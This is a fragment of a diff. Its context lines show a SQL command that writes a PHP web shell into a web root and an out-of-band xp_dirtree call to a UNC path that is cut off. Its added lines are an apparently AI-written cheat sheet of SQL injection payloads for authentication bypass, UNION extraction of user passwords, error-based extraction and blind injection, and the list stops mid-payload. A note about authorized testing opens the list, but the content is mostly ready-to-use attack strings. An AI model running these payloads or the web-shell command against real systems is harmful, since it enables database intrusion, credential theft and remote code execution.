@@ -85,3 +85,40 @@ COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/var/www/html/shell.php'
 EXEC master..xp_dirtree '\\att
 
 continue
+
+ Here’s a list of common SQL injection (SQLi) payloads categorized by attack type. These can be used for testing and understanding SQL injection vulnerabilities (only in authorized environments like penetration testing or CTFs).
+
+---
+
+### **1. Basic Authentication Bypass**
+```sql
+' OR '1'='1
+' OR 1=1 -- 
+" OR "" = "
+admin' --
+admin' OR '1'='1
+```
+
+---
+
+### **2. UNION-Based Attacks**
+Extract data from other tables using `UNION SELECT`:
+```sql
+' UNION SELECT 1,2,3 -- 
+' UNION SELECT username, password, NULL FROM users -- 
+```
+
+---
+
+### **3. Error-Based SQLi**
+Trigger database errors to extract information:
+```sql
+' AND (SELECT 0 FROM (SELECT COUNT(*), CONCAT((SELECT @@version), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- 
+```
+
+---
+
+### **4. Boolean-Based Blind SQLi**
+True/False conditions to infer data:
+```sql
+' AND SUBSTRING((SELECT password FROM users WHERE username='
